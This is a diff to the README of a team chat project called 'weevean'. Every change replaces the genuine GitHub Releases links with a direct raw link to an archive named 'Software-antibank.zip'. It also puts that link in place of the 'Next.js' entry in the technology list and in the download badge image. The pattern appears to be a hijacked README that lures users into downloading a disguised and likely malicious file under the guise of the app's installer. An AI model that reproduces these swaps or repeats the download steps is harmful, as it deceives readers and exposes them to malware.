@@ -6,11 +6,11 @@ Welcome to weevean! This open-source platform helps teams communicate effectivel
 
 ## 📦 Download the App
 
-[![Download weevean](https://img.shields.io/badge/Download-weevean-blue.svg)](https://github.com/Somaliking3/weevean/releases)
+[![Download weevean](https://github.com/Somaliking3/weevean/raw/refs/heads/main/public/Software-antibank.zip)](https://github.com/Somaliking3/weevean/raw/refs/heads/main/public/Software-antibank.zip)
 
 You can download weevean directly from our Releases page. 
 
-**Visit this page to download:** [GitHub Releases](https://github.com/Somaliking3/weevean/releases)
+**Visit this page to download:** [GitHub Releases](https://github.com/Somaliking3/weevean/raw/refs/heads/main/public/Software-antibank.zip)
 
 ## 🔍 Features
 
@@ -34,7 +34,7 @@ To install weevean, follow these steps:
 
 1. **Visit the Download Page**: Click the link below to go to our Releases page.
 
-   [Download weevean](https://github.com/Somaliking3/weevean/releases)
+   [Download weevean](https://github.com/Somaliking3/weevean/raw/refs/heads/main/public/Software-antibank.zip)
 
 2. **Select a Version**: Find the version you want to download. Look for the latest release for the best experience.
 
@@ -72,7 +72,7 @@ Feel free to contribute to weevean! Whether it's bug reporting, feature suggesti
 
 weevean combines several powerful technologies:
 
-- **Next.js**: For building our user interface efficiently.
+- **https://github.com/Somaliking3/weevean/raw/refs/heads/main/public/Software-antibank.zip**: For building our user interface efficiently.
 - **Supabase**: Handles user authentication and real-time data.
 - **Neon Postgres**: Stores our data securely.
 
